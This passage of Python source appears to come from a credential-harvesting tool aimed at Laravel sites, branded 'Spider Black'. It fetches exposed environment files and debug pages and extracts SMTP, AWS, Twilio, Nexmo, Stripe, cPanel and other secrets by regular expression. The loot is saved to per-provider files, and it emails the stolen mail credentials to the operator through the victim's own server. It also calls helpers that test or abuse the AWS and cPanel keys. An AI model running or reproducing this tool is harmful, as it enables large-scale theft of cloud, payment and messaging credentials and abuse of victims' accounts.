    return office365
def mailgun():
  ip_listx = open("settings.ini", 'r').read()

  if "mailgun=on" in ip_listx:
    mailgun = "on"
    return mailgun
  else:
    mailgun = "off"
    return mailgun

def phpunitshell():
  ip_listx = open("settings.ini", 'r').read()

  if "autoshell=on" in ip_listx:
    phpunitshell = "on"
    return phpunitshell
  else:
    phpunitshell = "off"
    return phpunitshell

def aws():
  ip_listx = open("settings.ini", 'r').read()

  if "aws=on" in ip_listx:
    aws = "on"
    return aws
  else:
    aws = "off"
    return aws
def twillio():
  ip_listx = open("settings.ini", 'r').read()

  if "twillio=on" in ip_listx:
    twillio = "on"
    return twillio
  else:
    twillio = "off"
    return twillio

def AWS_ACCESS_KEY():
  ip_listx = open("settings.ini", 'r').read()

  if "AWS_ACCESS_KEY=on" in ip_listx:
    AWS_ACCESS_KEY = "on"
    return AWS_ACCESS_KEY
  else:
    AWS_ACCESS_KEY = "off"
    return AWS_ACCESS_KEY

def AWS_KEY():
  ip_listx = open("settings.ini", 'r').read()

  if "AWS_KEY=on" in ip_listx:
    AWS_KEY = "on"
    return AWS_KEY
  else:
    AWS_KEY = "off"
    return AWS_KEY

def NEXMO():
  ip_listx = open("settings.ini", 'r').read()

  if "NEXMO=on" in ip_listx:
    NEXMO = "on"
    return NEXMO
  else:
    NEXMO = "off"
    return NEXMO

def EXOTEL():
  ip_listx = open("settings.ini", 'r').read()

  if "EXOTEL=on" in ip_listx:
    EXOTEL = "on"
    return EXOTEL
  else:
    EXOTEL = "off"
    return EXOTEL
def ONESIGNAL():
  ip_listx = open("settings.ini", 'r').read()

  if "ONESIGNAL=on" in ip_listx:
    ONESIGNAL = "on"
    return ONESIGNAL
  else:
    ONESIGNAL = "off"
    return ONESIGNAL

def TOKBOX():
  ip_listx = open("settings.ini", 'r').read()

  if "TOKBOX=on" in ip_listx:
    TOKBOX = "on"
    return TOKBOX
  else:
    TOKBOX = "off"
    return TOKBOX



def sendtest(url,host,port,user,passw,sender):
        
        if "465" in str(port):
          port = "587"
        else:
          port = str(port)

        if "unknown@unknown.com" in sender and "@" in user:
          sender_email = user
        else:
          sender_email = str(sender.replace('\"',''))

        smtp_server = str(host)
        login = str(user.replace('\"',''))
        password = str(passw.replace('\"',''))
        # specify the sender’s and receiver’s email addresses

        receiver_email = str(fsetting)
        # type your message: use two newlines (\n) to separate the subject from the message body, and use 'f' to  automatically insert variables in the text
        message = MIMEMultipart("alternative")
        message["Subject"] = "LARAVEL SMTP CRACK | HOST: "+str(host)
        if "zoho" in host:
          message["From"] = user
        else:
          message["From"] = sender_email
        message["To"] = receiver_email
        text = """\
        """
        # write the HTML part
        html = f"""\
        <html>
          <body>
              <p>-------------------</p>
              <p>URL    : {url}</p>
              <p>HOST   : {host}</p>
              <p>PORT   : {port}</p>
              <p>USER   : {user}</p>
              <p>PASSW  : {passw}</p>
              <p>SENDER : {sender}</p>
              <p>-------------------</p>
          </body>
        </html>
        """
        part1 = MIMEText(text, "plain")
        part2 = MIMEText(html, "html")
        message.attach(part1)
        message.attach(part2)

        try:
          s = smtplib.SMTP(smtp_server, port)
          s.connect(smtp_server,port)
          s.ehlo()
          s.starttls()
          s.ehlo()
          s.login(login, password)
          s.sendmail(sender_email, receiver_email, message.as_string())
          print(f'{lrd}[{lgn}SMTP SEND INFO{lrd}] {lgn}Sent To {gn}'+str(fsetting))
        except (gaierror, ConnectionRefusedError):
          print(f'{lrd}[{lgn}SMTP SEND INFO{lrd}] {lrd}Failed to connect to the server. Bad connection settings?')
          pass
        except smtplib.SMTPServerDisconnected:
          print(f'{lrd}[{lgn}SMTP SEND INFO{lrd}] {lrd}Failed to connect to the server. Wrong user/password?')
          pass
        except smtplib.SMTPException as e:
          print(f'{lrd}[{lgn}SMTP SEND INFO{lrd}] {lrd}SMTP error occurred : {rd}' + str(e))
          pass


def prepare(sites):

    try:
      meki = requests.get(sites+'/.spider',headers=Headers,timeout=8)
      if 'DB_PASSWORD=' in meki.text:
        print(f"{lrd}[{lgn}+{lrd}] {lgn} Spider black : {gn}{str(sites)} | {lgn}Success")
        open('config-'+year+month+day+'.txt', 'a').write("\n---------------Spider [@esfelurm] Black-------------\n"+sites+"\n"+meki.text + '\n-----------------------------------------\n\n')
      else:
        print(f"{lrd}[{lgn}!{lrd}] {lgn} Spider black {str(sites)} | {rd}Failed")
    except Exception as e:
        pass

def get_smtp(url,text):
  try:
    if "MAIL_HOST" in text:
      if "MAIL_HOST=" in text:
        mailhost = reg("\nMAIL_HOST=(.*?)\n", text)[0]
        try:
          mailport = reg("\nMAIL_PORT=(.*?)\n", text)[0]
        except:
          mailport = 587
        mailuser = reg("\nMAIL_USERNAME=(.*?)\n", text)[0]
        mailpass = reg("\nMAIL_PASSWORD=(.*?)\n", text)[0]
        if "MAIL_FROM" in text:
          mailfrom = reg("\nMAIL_FROM_ADDRESS=(.*?)\n", text)[0]
        else:
          mailfrom = "unknown@unknown.com"
          
        build = 'URL: '+str(url)+'\nMAILHOST: '+str(mailhost)+'\nMAILPORT: '+str(mailport)+'\nMAILUSER: '+str(mailuser)+'\nMAILPASS: '+str(mailpass)+'\nMAILFROM: '+str(mailfrom)
        remover = str(build).replace('\r', '')
        if ".amazonaws.com" in text and aws() == "on":
          mailhost = reg("\nMAIL_HOST=(.*?)\n", text)[0]
          mailport = reg("\nMAIL_PORT=(.*?)\n", text)[0]
          mailuser = reg("\nMAIL_USERNAME=(.*?)\n", text)[0]
          mailpass = reg("\nMAIL_PASSWORD=(.*?)\n", text)[0]
          if "MAIL_FROM" in text:
            emailform = reg("\nMAIL_FROM_ADDRESS=(.*?)\n", text)[0]
          else:
            emailform = "UNKNOWN"
          getcountry = reg('email-smtp.(.*?).amazonaws.com', mailhost)[0]
          
          build = 'URL: '+str(url)+'\nMAILHOST: '+str(mailhost)+'\nMAILPORT: '+str(mailport)+'\nMAILUSER: '+str(mailuser)+'\nMAILPASS: '+str(mailpass)+'\nMAIL_FROM_ADDRESS: '+str(emailform)
          remover = str(build).replace('\r', '')
          print ("\033[1;40m[BY Flash-X] {} |   {gn}amazonaws\n")
          save = open('result/'+getcountry+'.txt', 'a')
          save.write(str(remover)+'\n\n')
          save.close()
          save2 = open('result/smtp_aws_ses.txt', 'a')
          save2.write(str(remover)+'\n\n')
          save2.close()
          try:
            sendtest(url,mailhost,mailport,mailuser,mailpass,emailform)
          except:
            print(f"{lrd}[{lgn}+{lrd}] {lgn} Spider Black {str(url)} | {rd}Failed Send\n")

        elif "smtp.sendgrid.net" in str(mailhost) and sendgrid() == "on":
          print(f"{lrd}[{lgn}+{lrd}] {lgn} Spider Black {str(url)} | {gn}Sendgrid\n")
          save = open('result/sendgrid.txt', 'a')
          save.write(str(remover)+'\n\n')
          save.close()
        elif "mailgun.org" in str(mailhost) and mailgun() == "on":
          print(f"{lrd}[{lgn}+{lrd}] {lgn} Spider Black {str(url)} | {gn}mailgun\n")
          save = open('result/mailgun.txt', 'a')
          save.write(str(remover)+'\n\n')
          save.close()
        elif "sparkpostmail.com" in str(mailhost) and sparkpostmail() == "on":
          print(f"{lrd}[{lgn}+{lrd}] {lgn} Spider Black {str(url)} | {gn}sparkpostmail\n")
          save = open('result/sparkpostmail.txt', 'a')
          save.write(str(remover)+'\n\n')
          save.close()
        elif "mandrillapp.com" in str(mailhost) and mandrillapp() == "on":
          print(f"{lrd}[{lgn}+{lrd}] {lgn} Spider Black {str(url)} | {gn}mandrillapp\n")
          save = open('result/mandrill.txt', 'a')
          save.write(str(remover)+'\n\n')
          save.close()
        elif "smtp-relay.gmail" in str(mailhost) and relay() == "on":
          print(f"{lrd}[{lgn}+{lrd}] {lgn} Spider Black {str(url)} | {gn}mrelay\n")
          save = open('result/smtp-relay.txt', 'a')
          save.write(str(remover)+'\n\n')
          save.close()
        elif "sendinblue.com" in str(mailhost) and sendinblue() == "on":
          print(f"{lrd}[{lgn}+{lrd}] {lgn} Spider Black {str(url)} | {gn}sendinblue\n")
          save = open('result/sendinblue.txt', 'a')
          save.write(str(remover)+'\n\n')
          save.close()
        elif "kasserver.com" in str(mailhost):
          print(f"{lrd}[{lgn}+{lrd}] {lgn} Spider Black {str(url)} | {gn}sendinblue\n")
          save = open('result/kasserver.txt', 'a')
          save.write(str(remover)+'\n\n')
          save.close()
        elif "zoho." in str(mailhost) and zoho() == "on":
          print(f"{lrd}[{lgn}+{lrd}] {lgn} Spider Black {str(url)} |  {gn}zoho\n")
          save = open('result/zoho.txt', 'a')
          save.write(str(remover)+'\n\n')
          save.close()
        elif "1and1." in str(mailhost) and and1() == "on":
          print(f"{lrd}[{lgn}+{lrd}] {lgn} Spider Black {str(url)} |  {gn}1and1\n")
          save = open('result/1and1.txt', 'a')
          save.write(str(remover)+'\n\n')
          save.close()
        elif mailhost == "smtp.office365.com" and office365() == "on" :
          print(f"{lrd}[{lgn}+{lrd}] {lgn} Spider Black {str(url)} | {gn}office365\n")
          save = open('result/office365.txt', 'a')
          save.write(str(remover)+'\n\n')
          save.close()
        elif "zimbra" in str(mailhost) and zimbra() == "on" :
          print(f"{lrd}[{lgn}+{lrd}] {lgn} Spider Black {str(url)} | {gn}mZimbra\n")
          save = open('result/zimbra.txt', 'a')
          save.write(str(remover)+'\n\n')
          save.close()
        elif mailuser != "null" and mailpass != "null" and mailhost!="smtp.mailtrap.io" or mailuser != "" and mailpass != "" and mailhost!="smtp.mailtrap.io" or mailhost!="smtp.mailtrap.io":
          print(f"{lrd}[{lgn}+{lrd}] {lgn} Spider Black {str(url)} |  {gn}SMTP Random\n")
          save = open('result/SMTP_RANDOM.txt', 'a')
          save.write(str(remover)+'\n\n')
          save.close()
        elif mailuser == "null" or mailpass == "null" or mailuser == "" or mailpass == "" or mailhost=="smtp.mailtrap.io":
          print(f"{lrd}[{lgn}+{lrd}] {lgn} Spider Black {str(url)} | Invalid SMTP\n")  
        try:
          sendtest(url,mailhost,mailport,mailuser,mailpass,mailfrom)
        except:
          print(f"{lrd}[{lgn}+{lrd}] {lgn} Spider Black {str(url)} | Failed Send\n")
    else:
      print(f"{lrd}[{lgn}+{lrd}] {lgn} Spider Black {str(url)} | Failed SMTP\n")



    if "TWILIO_ACCOUNT_SID=" in text and twillio() == "on":
      acc_sid = reg('\nTWILIO_ACCOUNT_SID=(.*?)\n', text)[0]
      try:
        phone = reg('\nTWILIO_NUMBER=(.*?)\n', text)[0]
      except:
        phone = ""
      auhtoken = reg('\nTWILIO_AUTH_TOKEN=(.*?)\n', text)[0]

      build = 'URL: '+url+'\nTWILIO_ACCOUNT_SID: '+str(acc_sid)+'\nTWILIO_NUMBER: '+str(phone)+'\nTWILIO_AUTH_TOKEN: '+str(auhtoken)
      remover = str(build).replace('\r', '')
      save = open('result/twillio.txt', 'a')
      save.write(remover+'\n\n')
      save.close()
      try:
        twilliocheck(url,acc_sid,auhtoken,phone)
      except:
        print(f"{lrd}[{lgn}+{lrd}] {lgn} Spider Black {str(url)} |  {gn}Invalid Twillio\n".format(url))
    elif "TWILIO_SID=" in text and twillio() == "on":
      acc_sid = reg('\nTWILIO_SID=(.*?)\n', text)[0]
      acc_key = reg('\nTWILIO_TOKEN=(.*?)\n', text)[0]
      try:
        acc_from = reg('\nTWILIO_FROM=(.*?)\n', text)[0]
      except:
        acc_from = ""
    
      build = 'URL: '+str(url)+'\nTWILIO_SID: '+str(acc_sid)+'\nTWILIO_TOKEN: '+str(acc_key)+'\nTWILIO_FROM: '+str(acc_from)
      remover = str(build).replace('\r', '')
      save = open('result/twillio.txt', 'a')
      save.write(remover+'\n\n')
      save.close()
      try:
        twilliocheck(url,acc_sid,auhtoken,phone)
      except: 
        print(f"{lrd}[{lgn}+{lrd}] {lgn} Spider Black {str(url)} |  {gn}Invalid Twillio\n".format(url))
    elif "ACCOUNT_SID=" in text and twillio() == "on":
      acc_sid = reg('\nACCOUNT_SID=(.*?)\n', text)[0]
      acc_key = reg('\nAUTH_TOKEN=(.*?)\n', text)[0]
      try:
        acc_from = reg('\nTwilio_Number=(.*?)\n', text)[0]
      except:
        acc_from = ""
      build = 'URL: '+str(url)+'\nTWILIO_SID: '+str(acc_sid)+'\nTWILIO_TOKEN: '+str(acc_key)+'\nTWILIO_FROM: '+str(acc_from)
      remover = str(build).replace('\r', '')
      save = open('result/twillio.txt', 'a')
      save.write(remover+'\n\n')
      save.close()
      try:
        twilliocheck(url,acc_sid,auhtoken,phone)
      except:
        print(f"{lrd}[{lgn}+{lrd}] {lgn} Spider Black {str(url)} |  {gn}Invalid Twillio\n".format(url))



    if 'AWS_ACCESS_KEY_ID=' in text and AWS_ACCESS_KEY() == "on":
      mailhost = reg("\nAWS_ACCESS_KEY_ID=(.*?)\n", text)[0]
      mailport = reg("\nAWS_SECRET_ACCESS_KEY=(.*?)\n", text)[0]
      mailuser = reg("\nAWS_DEFAULT_REGION=(.*?)\n", text)[0]
      build = 'URL: '+str(url)+'\nAWS_ACCESS_KEY_ID: '+str(mailhost)+'\nAWS_SECRET_ACCESS_KEY: '+str(mailport)+'\nAWS_DEFAULT_REGION: '+str(mailuser)
      build2 = str(mailhost)+'|'+str(mailport)+'|'+str(mailuser)
      remover = str(build).replace('\r', '')
      if str(mailuser) != "" and  str(mailport) !="":
        print(f"{lrd}[{lgn}+{lrd}] {lgn} Spider Black {str(url)} |  {gn}AWS_ACCESS_KEY\n")
        save = open('result/'+mailuser+'.txt', 'a')
        save.write(remover+'\n\n')
        save.close()
        save2 = open('result/aws_secret_key.txt', 'a')
        save2.write(remover+'\n\n')
        save2.close()
        save3 = open('result/aws_secret_key_for_checker.txt', 'a')
        save3.write(build2+'\n')
        save3.close()
        try:
          autocreateses(url,mailhost,mailport,mailuser)
        except:
          print(f"{lrd}[{lgn}+{lrd}] {lgn} Spider Black {str(url)} |  {gn}CANT CRACK AWS KEY\n")
    elif 'AWS_KEY=' in text and AWS_KEY() == "on":
      mailhost = reg("\nAWS_KEY=(.*?)\n", text)[0]
      mailport = reg("\nAWS_SECRET=(.*?)\n", text)[0]
      mailuser = reg("\nAWS_REGION=(.*?)\n", text)[0]
      build = 'URL: '+str(url)+'\nAWS_ACCESS_KEY_ID: '+str(mailhost)+'\nAWS_SECRET_ACCESS_KEY: '+str(mailport)+'\nAWS_DEFAULT_REGION: '+str(mailuser)
      remover = str(build).replace('\r', '')
      build2 = str(mailhost)+'|'+str(mailport)+'|'+str(mailuser)
      if str(mailuser) != "" and  str(mailport) !="":
        print(f"{lrd}[{lgn}+{lrd}] {lgn} Spider Black {str(url)} |  {gn}AWS_ACCESS_KEY\n")
        save = open('result/'+mailuser+'.txt', 'a')
        save.write(remover+'\n\n')
        save.close()
        save2 = open('result/aws_secret_key.txt', 'a')
        save2.write(remover+'\n\n')
        save2.close()
        save3 = open('result/aws_secret_key_for_checker.txt', 'a')
        save3.write(build2+'\n\n')
        save3.close()
        try:
          autocreateses(url,mailhost,mailport,mailuser)
        except:
          print(f"{lrd}[{lgn}+{lrd}] {lgn} Spider Black {str(url)} |  {gn}CANT CRACK AWS KEY\n")
    elif 'AWSAPP_KEY=' in text and AWS_KEY() == "on":
      mailhost = reg("\nAWSAPP_KEY=(.*?)\n", text)[0]
      mailport = reg("\nAWSAPP_SECRET=(.*?)\n", text)[0]
      mailuser = reg("\nAWSAPP_REGION=(.*?)\n", text)[0]
      build = 'URL: '+str(url)+'\nAWS_ACCESS_KEY_ID: '+str(mailhost)+'\nAWS_SECRET_ACCESS_KEY: '+str(mailport)+'\nAWS_DEFAULT_REGION: '+str(mailuser)
      remover = str(build).replace('\r', '')
      build2 = str(mailhost)+'|'+str(mailport)+'|'+str(mailuser)
      if str(mailuser) != "" and  str(mailport) !="":
        print(f"{lrd}[{lgn}+{lrd}] {lgn} Spider Black {str(url)} |  {gn}AWS_ACCESS_KEY\n")
        save = open('result/'+mailuser+'.txt', 'a')
        save.write(remover+'\n\n')
        save.close()
        save2 = open('result/aws_secret_key.txt', 'a')
        save2.write(remover+'\n\n')
        save2.close()
        save3 = open('result/aws_secret_key_for_checker.txt', 'a')
        save3.write(build2+'\n\n')
        save3.close()
        try:
          autocreateses(url,mailhost,mailport,mailuser)
        except:
          print(f"{lrd}[{lgn}+{lrd}] {lgn} Spider Black {str(url)} |  {gn}CANT CRACK AWS KEY\n")
    elif 'SES_KEY=' in text and AWS_KEY() == "on":
      print(f"{lrd}[{lgn}+{lrd}] {lgn} Spider Black {str(url)} |  {gn}AWS_ACCESS_KEY")
      mailhost = reg("\nSES_KEY=(.*?)\n", text)[0]
      mailport = reg("\nSES_SECRET=(.*?)\n", text)[0]
      mailuser = reg("\nSES_REGION=(.*?)\n", text)[0]
      build = 'URL: '+str(url)+'\nSES_KEY: '+str(mailhost)+'\nSES_SECRET: '+str(mailport)+'\nSES_REGION: '+str(mailuser)
      remover = str(build).replace('\r', '')
      if str(mailuser) != "" and  str(mailport) !="":
        print(f"{lrd}[{lgn}+{lrd}] {lgn} Spider Black {str(url)} |  {gn}AWS_ACCESS_KEY\n")
        save = open('result/'+mailuser+'.txt', 'a')
        save.write(remover+'\n\n')
        save.close()
        save2 = open('result/ses_key.txt', 'a')
        save2.write(remover+'\n\n')
        save2.close()
        try:
          autocreateses(url,mailhost,mailport,mailuser)
        except:
          print(f"{lrd}[{lgn}+{lrd}] {lgn} Spider Black {str(url)} |  {gn}CANT CRACK AWS KEY\n")

    
    if 'MAILER_DSN=' in text:
      print(f"{lrd}[{lgn}+{lrd}] {lgn} Spider Black {str(url)} |  {gn}SYMFONY\n")
      mailhost = reg("\nMAILER_DSN=(.*?)\n", text)[0]
      build = 'URL: '+str(url)+'\nMAILER_DSN: '+str(mailhost)
      remover = str(build).replace('\r', '')
      if str(mailhost) != "" and  str(mailhost) !="smtp://localhost":
        save = open('result/symfony_mailer_dsn.txt', 'a')
        save.write(remover+'\n\n')
        save.close()
    
    if "NEXMO" in text and NEXMO() == "on":
      if "NEXMO_KEY=" in text:
        try:
          nexmo_key = reg('\nNEXMO_KEY=(.*?)\n', text)[0]
        except:
          nexmo_key = ''
        try:
          nexmo_secret = reg('\nNEXMO_SECRET=(.*?)\n', text)[0]
        except:
          nexmo_secret = ''
        try:
          phone = reg('\nNEXMO_NUMBER=(.*?)\n', text)[0]
        except:
          phone = ''
        print(f"{lrd}[{lgn}+{lrd}] {lgn} Spider Black {str(url)} |  {gn}NEXMO\n")
        build = 'URL: '+str(url)+'\nnexmo_key: '+str(nexmo_key)+'\nnexmo_secret: '+str(nexmo_secret)+'\nphone: '+str(phone)
        remover = str(build).replace('\r', '')
        save = open('result/NEXMO.txt', 'a')
        save.write(remover+'\n\n')
        save.close()
        try:
          nexmosend(url,nexmo_key,nexmo_secret)
        except:
          print(f"{lrd}[{lgn}+{lrd}] {lgn} Spider Black {str(url)} |  {gn}INVALI NEXMO\n")
      elif "NEXMO_API_KEY=" in text:
        try:
          nexmo_key = reg('\nNEXMO_API_KEY=(.*?)\n', text)[0]
        except:
          nexmo_key = ''
        try:
          nexmo_secret = reg('\nNEXMO_API_SECRET=(.*?)\n', text)[0]
        except:
          nexmo_secret = ''
        try:
          phone = reg('\nNEXMO_API_NUMBER=(.*?)\n', text)[0]
        except:
          phone = ''
        print(f"{lrd}[{lgn}+{lrd}] {lgn} Spider Black {str(url)} |  {gn}NEXMO\n")
        build = 'URL: '+str(url)+'\nnexmo_key: '+str(nexmo_key)+'\nnexmo_secret: '+str(nexmo_secret)+'\nphone: '+str(phone)
        remover = str(build).replace('\r', '')
        save = open('result/NEXMO.txt', 'a')
        save.write(remover+'\n\n')
        save.close()
        try:
          nexmosend(url,nexmo_key,nexmo_secret)
        except:
          print(f"{lrd}[{lgn}+{lrd}] {lgn} Spider Black {str(url)} |  {gn}INVALI NEXMO\n")


    if "EXOTEL_API_KEY" in text and EXOTEL() == "on":
      if "EXOTEL_API_KEY=" in text:
        try:
          exotel_api = reg('\nEXOTEL_API_KEY=(.*?)\n', text)[0]
        except:
          exotel_api = ''
        try:
          exotel_token = reg('\nEXOTEL_API_TOKEN=(.*?)\n', text)[0]
        except:
          exotel_token = ''
        try:
          exotel_sid = reg('\nEXOTEL_API_SID=(.*?)\n', text)[0]
        except:
          exotel_sid = ''
        print(f"{lrd}[{lgn}+{lrd}] {lgn} Spider Black {str(url)} |  {gn}EXOTEL\n")
        build = 'URL: '+str(url)+'\nEXOTEL_API_KEY: '+str(exotel_api)+'\nEXOTEL_API_TOKEN: '+str(exotel_token)+'\nEXOTEL_API_SID: '+str(exotel_sid)
        remover = str(build).replace('\r', '')
        save = open('result/EXOTEL.txt', 'a')
        save.write(remover+'\n\n')
        save.close()


    if "ONESIGNAL_APP_ID" in text and ONESIGNAL() == "on":
      if "ONESIGNAL_APP_ID=" in text:
        try:
          onesignal_id = reg('\nONESIGNAL_APP_ID=(.*?)\n', text)[0]
        except:
          onesignal_id = ''
        try:
          onesignal_token = reg('\nONESIGNAL_REST_API_KEY=(.*?)\n', text)[0]
        except:
          onesignal_id = ''
        try:
          onesignal_auth = reg('\nONESIGNAL_USER_AUTH_KEY=(.*?)\n', text)[0]
        except:
          onesignal_auth = ''
        print(f"{lrd}[{lgn}+{lrd}] {lgn} Spider Black {str(url)} |  {gn}ONESIGNAL\n")
        build = 'URL: '+str(url)+'\nONESIGNAL_APP_ID: '+str(onesignal_id)+'\nONESIGNAL_REST_API_KEY: '+str(onesignal_token)+'\nONESIGNAL_USER_AUTH_KEY: '+str(onesignal_auth)
        remover = str(build).replace('\r', '')
        save = open('result/ONESIGNAL.txt', 'a')
        save.write(remover+'\n\n')
        save.close()

    if "TOKBOX_KEY_DEV" in text and TOKBOX() == "on":
      if "TOKBOX_KEY_DEV=" in text:
        try:
          tokbox_key = reg('\nTOKBOX_KEY_DEV=(.*?)\n', text)[0]
        except:
          tokbox_key = ''
        try:
          tokbox_secret = reg('\nTOKBOX_SECRET_DEV=(.*?)\n', text)[0]
        except:
          tokbox_secret = ''
        print(f"{lrd}[{lgn}+{lrd}] {lgn} Spider Black {str(url)} |  {gn}TOKBOX\n")
        build = 'URL: '+str(url)+'\nTOKBOX_KEY_DEV: '+str(tokbox_key)+'\nTOKBOX_SECRET_DEV: '+str(tokbox_secret)
        remover = str(build).replace('\r', '')
        save = open('result/TOKBOX.txt', 'a')
        save.write(remover+'\n\n')
        save.close()
    elif "TOKBOX_KEY" in text and TOKBOX() == "on":
      if "TOKBOX_KEY=" in text:
        try:
          tokbox_key = reg('\nTOKBOX_KEY=(.*?)\n', text)[0]
        except:
          tokbox_key = ''
        try:
          tokbox_secret = reg('\nTOKBOX_SECRET=(.*?)\n', text)[0]
        except:
          tokbox_secret = ''
        print(f"{lrd}[{lgn}+{lrd}] {lgn} Spider Black {str(url)} |  {gn}TOKBOX\n")
        build = 'URL: '+str(url)+'\nTOKBOX_KEY_DEV: '+str(tokbox_key)+'\nTOKBOX_SECRET_DEV: '+str(tokbox_secret)
        remover = str(build).replace('\r', '')
        save = open('result/TOKBOX.txt', 'a')
        save.write(remover+'\n\n')
        save.close()
    
    
    if "CPANEL_HOST=" in text:
      try:
        cipanel_host = reg('\nCPANEL_HOST=(.*?)\n', text)[0]
      except:
        cipanel_host = ''
      try:
        cipanel_port = reg('\nCPANEL_PORT=(.*?)\n', text)[0]
      except:
        cipanel_port = ''
      try:
        cipanel_user = reg('\nCPANEL_USERNAME=(.*?)\n', text)[0]
        cuser = reg('\nDB_USERNAME=(.*?)\n', text)[0]
        if "_" in cuser:
          cuser = cuser.split("_")[0]
      except:
        cipanel_user = ''
      try:
        cipanel_pw = reg('\nCPANEL_PASSWORD=(.*?)\n', text)[0]
        cpasswd = reg('\nDB_USERNAME=(.*?)\n', text)[0]
      except:
        cipanel_pw = ''
      if cuser != '' and cpasswd != '':
        checkcpanel(url,cuser,cpasswd)
      elif cipanel_user != '' and cipanel_pw != '':
        checkcpanel(url,cipanel_user,cipanel_pw)
        
      build = 'URL: '+str(url)+'\nCPANEL_HOST: '+str(cipanel_host)+'\nCPANEL_PORT: '+str(cipanel_port)+'\nCPANEL_USERNAME: '+str(cipanel_user)+'\nCPANEL_PASSWORD: '+str(cipanel_pw)
      remover = str(build).replace('\r', '')
      save = open('result/CPANEL.txt', 'a')
      save.write(remover+'\n\n')
      save.close()

    if "STRIPE_KEY=" in text:
      try:
        stripe_1 = reg("\nSTRIPE_KEY=(.*?)\n", text)[0]
      except:
        stripe_1 = ''
      try:
        stripe_2 = reg("\nSTRIPE_SECRET=(.*?)\n", text)[0]
      except:
        stripe_2 = ''
      build = 'URL: '+str(url)+'\nSTRIPE_KEY: '+str(stripe_1)+'\nSTRIPE_SECRET: '+str(stripe_2)
      remover = str(build).replace('\r', '')
      save = open('Result/STRIPE_KEY.txt', 'a')
      save.write(remover+'\n\n')
      save.close()

  except Exception as e:
    pass









def get_smtp2(url,text):
  try:
    if "<td>MAIL_HOST</td>" in text:
      if "<td>MAIL_HOST</td>" in text:
        mailhost = reg('<td>MAIL_HOST<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
        try:
          mailport = reg('<td>MAIL_PORT<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
        except:
          mailport =  587
        mailuser = reg('<td>MAIL_USERNAME<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
        mailpass = reg('<td>MAIL_PASSWORD<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
        try:
          mailfrom = reg('<td>MAIL_FROM_ADDRESS<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
        except:
          mailfrom = "unknown@unknown.com"
        build = 'URL: '+str(url)+'\nMAILHOST: '+str(mailhost)+'\nMAILPORT: '+str(mailport)+'\nMAILUSER: '+str(mailuser)+'\nMAILPASS: '+str(mailpass)+'\nMAILFROM: '+str(mailfrom)
        remover = str(build).replace('\r', '')
        
        if ".amazonaws.com" in text and aws() == "on":
          mailhost = reg("\nMAIL_HOST=(.*?)\n", text)[0]
          mailport = reg("\nMAIL_PORT=(.*?)\n", text)[0]
          mailuser = reg("\nMAIL_USERNAME=(.*?)\n", text)[0]
          mailpass = reg("\nMAIL_PASSWORD=(.*?)\n", text)[0]
          if "MAIL_FROM" in text:
            emailform = reg("\nMAIL_FROM_ADDRESS=(.*?)\n", text)[0]
          else:
            emailform = "UNKNOWN"
          getcountry = reg('email-smtp.(.*?).amazonaws.com', mailhost)[0]
          build = 'URL: '+str(url)+'\nMAILHOST: '+str(mailhost)+'\nMAILPORT: '+str(mailport)+'\nMAILUSER: '+str(mailuser)+'\nMAILPASS: '+str(mailpass)+'\nMAILFROM: '+str(emailform)
          remover = str(build).replace('\r', '')
          print(f"{lrd}[{lgn}+{lrd}] {lgn} Spider Black {str(url)} |  {gn} amazonaws\n")
          save = open('result/'+getcountry+'.txt', 'a')
          save.write(str(remover)+'\n\n')
          save.close()
          save2 = open('result/smtp_aws_ses.txt', 'a')
          save2.write(str(remover)+'\n\n')
          save2.close()
          try:
            sendtest(url,mailhost,mailport,mailuser,mailpass,emailform)
          except:
            pass
        elif "smtp.sendgrid.net" in str(mailhost) and sendgrid() == "on":
          print(f"{lrd}[{lgn}+{lrd}] {lgn} Spider Black {str(url)} |  {gn}Sendgrid\n")
          save = open('result/sendgrid.txt', 'a')
          save.write(str(remover)+'\n\n')
          save.close()
        elif "mailgun.org" in str(mailhost) and mailgun() == "on":
          print(f"{lrd}[{lgn}+{lrd}] {lgn} Spider Black {str(url)} |  {gn}mailgun\n")
          save = open('result/mailgun.txt', 'a')
          save.write(str(remover)+'\n\n')
          save.close()
        elif "sparkpostmail.com" in str(mailhost) and sparkpostmail() == "on":
          print(f"{lrd}[{lgn}+{lrd}] {lgn} Spider Black {str(url)} |  {gn}sparkpostmail\n")
          save = open('result/sparkpostmail.txt', 'a')
          save.write(str(remover)+'\n\n')
          save.close()
        elif "mandrillapp.com" in str(mailhost) and mandrillapp() == "on":
          print(f"{lrd}[{lgn}+{lrd}] {lgn} Spider Black {str(url)} |  {gn}mandrillapp\n")
          save = open('result/mandrill.txt', 'a')
          save.write(str(remover)+'\n\n')
          save.close()
        elif "zoho." in str(mailhost) and zoho() == "on":
          print(f"{lrd}[{lgn}+{lrd}] {lgn} Spider Black {str(url)} |  {gn}zoho\n")
          save = open('result/zoho.txt', 'a')
          save.write(str(remover)+'\n\n')
          save.close()
        elif "smtp-relay.gmail" in str(mailhost) and relay() == "on":
          print(f"{lrd}[{lgn}+{lrd}] {lgn} Spider Black {str(url)} |  {gn}relay\n")
          save = open('result/smtp-relay.txt', 'a')
          save.write(str(remover)+'\n\n')
          save.close()
        elif "sendinblue.com" in str(mailhost) and sendinblue() == "on":
          print(f"{lrd}[{lgn}+{lrd}] {lgn} Spider Black {str(url)} |  {gn}sendinblue\n")
          save = open('result/sendinblue.txt', 'a')
          save.write(str(remover)+'\n\n')
          save.close()
        elif "kasserver.com" in str(mailhost):
          print(f"{lrd}[{lgn}+{lrd}] {lgn} Spider Black {str(url)} |  {gn}sendinblue\n")
          save = open('result/kasserver.txt', 'a')
          save.write(str(remover)+'\n\n')
          save.close()
        elif "1and1." in str(mailhost) and and1() == "on":
          print(f"{lrd}[{lgn}+{lrd}] {lgn} Spider Black {str(url)} |  {gn}1and1\n")
          save = open('result/1and1.txt', 'a')
          save.write(str(remover)+'\n\n')
          save.close()
        elif mailhost == "smtp.office365.com" and office365() == "on":
          print(f"{lrd}[{lgn}+{lrd}] {lgn} Spider Black {str(url)} |  {gn}office365\n")
          save = open('result/office365.txt', 'a')
          save.write(str(remover)+'\n\n')
          save.close()
        elif "zimbra" in str(mailhost) and zimbra() == "on" :
          print(f"{lrd}[{lgn}+{lrd}] {lgn} Spider Black {str(url)} |  {gn}Zimbra\n")
          save = open('result/zimbra.txt', 'a')
